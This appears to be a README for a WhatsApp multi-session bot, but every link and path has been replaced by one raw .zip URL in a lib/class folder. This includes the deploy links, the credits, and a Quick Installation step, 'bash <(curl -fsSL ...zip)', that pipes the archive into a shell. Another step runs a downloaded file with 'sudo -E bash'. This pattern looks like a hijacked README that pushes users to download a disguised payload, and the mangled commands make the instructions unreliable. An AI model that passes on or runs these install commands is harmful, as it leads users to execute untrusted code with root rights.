# WhatsApp MD User Bot

A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage more than one bot on the same deployment.

## Important Links

- [Bot Environment Variables](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
- [FAQ](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)

## Setup

### Deploy on Koyeb

- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with Koyeb.

### Deploy on Render

- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with Render.

### Deploy on Panel

- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with the Panel.

### Deploy on VPS or PC (Example for Ubuntu)

 #### Quick Installation
    bash <(curl -fsSL https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
 #### Manual Installation

1. **Install Git, ffmpeg, and curl:**
    ```sh
    sudo apt -y update && sudo apt -y upgrade
    sudo apt -y install git ffmpeg curl
    ```

2. **Install https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip**
    ```sh
    curl -fsSL https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip -o https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
    sudo -E bash https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
    sudo apt-get install -y nodejs
    ```

3. **Install Yarn:**
    ```sh
    sudo npm install -g yarn
    ```

4. **Install pm2:**
    ```sh
    sudo yarn global add pm2
    ```

5. **Clone Repository and Install Packages:**
    ```sh
    git clone https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip botName
    cd botName
    yarn install
    ```

6. **Enter Environment Variables:**
    ```sh
    echo "SESSION_ID = Session_Id_you_Got_After_Scan_Dont_Add_This_Line_If_You_Can_Scan_From_Terminal_Itself
    PREFIX = .
    STICKER_PACKNAME = LyFE
    ALWAYS_ONLINE = false
    RMBG_KEY = null
    LANGUAG = en
    WARN_LIMIT = 3
    FORCE_LOGOUT = false
    BRAINSHOP = 159501,6pq8dPiYt7PdqHz3
    MAX_UPLOAD = 200
    REJECT_CALL = false
    SUDO = 989876543210
    TZ = Asia/Kolkata
    VPS = true
    AUTO_STATUS_VIEW = true
    SEND_READ = true
    AJOIN = true
    DISABLE_START_MESSAGE = false
    PERSONAL_MESSAGE = null" > https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
    ```

7. **Edit `https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip` Using Nano (if needed):**
    - To save, press `Ctrl + O`, then press `Enter`, and to exit, press `Ctrl + X`.

8. **Start and Stop the Bot:**
    - To start the bot:
      ```sh
      pm2 start . --name botName --attach --time
      ```
    - To stop the bot:
      ```sh
      pm2 stop botName
      ```

### Deploy on Replit

[![Run on Replit](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)

1. Fork the repository.
2. Edit `https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip`.
3. Click run.

### Thanks To

- [Yusuf Usta](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) for [WhatsAsena](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
- [@adiwajshing](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) for [Baileys](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
